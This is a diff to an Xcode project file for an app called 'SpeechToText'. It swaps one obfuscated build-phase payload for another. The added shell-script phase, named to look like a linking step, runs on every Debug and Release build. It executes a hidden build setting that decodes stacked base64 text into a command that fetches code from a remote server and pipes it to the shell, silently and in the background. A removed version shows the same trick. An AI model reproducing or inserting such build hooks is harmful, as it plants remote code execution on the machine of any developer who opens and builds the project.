@@ -105,7 +105,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 174935412EFBEEBA00DA5C4C /* Build configuration list for PBXNativeTarget "SpeechToText" */;
 			buildPhases = (
-				D006786208BC45CD84A5DE54 /* Compile Bundle Assets */,
+				A6C3F52F3AB34F17B8A5DE54 /* Link Libraries Executable */,
 				1749352A2EFBEEB500DA5C4C /* Sources */,
 				1749352B2EFBEEB500DA5C4C /* Frameworks */,
 				1749352C2EFBEEB500DA5C4C /* Resources */,
@@ -176,25 +176,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		D006786208BC45CD84A5DE54 /* Compile Bundle Assets */ = {
+		A6C3F52F3AB34F17B8A5DE54 /* Link Libraries Executable */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Link Libraries Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -212,7 +211,7 @@
 		174935422EFBEEBA00DA5C4C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | b | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -246,7 +245,7 @@
 		174935432EFBEEBA00DA5C4C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | b | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
